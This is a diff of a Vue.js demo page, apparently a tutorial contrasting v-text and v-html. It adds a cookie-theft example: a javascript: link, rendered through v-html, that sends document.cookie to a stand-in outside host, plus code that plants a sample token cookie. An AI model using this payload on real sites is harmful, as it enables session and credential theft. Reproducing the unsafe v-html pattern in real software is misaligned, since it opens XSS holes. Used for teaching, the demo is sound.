@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>个人信息表单</title>
     <meta charset="UTF-8" />
     <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
   </head>
@@ -10,14 +9,20 @@
       <div v-text="text">被替换内容</div>
       <div v-html="html">被替换内容</div>
       <div v-text="html">text不解析富文本</div>
+      <div v-html="unsafehtml">不安全的现象</div>
     </div>
 
     <script>
+      // 设置一个将要被盗取的token
+      document.cookie = "token=123;expires=" + new Date(new Date().getTime() + 24 * 60 * 60 * 1000).toUTCString();
+
       const app = new Vue({
         el: "#app",
         data: {
           text: "text demo",
           html: "<h1>html demo</h1>",
+          unsafehtml:
+            "<a href=javascript:location.href='https://www.youwebxxx.com?'+document.cookie>点击盗取非httpOnly的cookie</a>",
         },
       });
     </script>
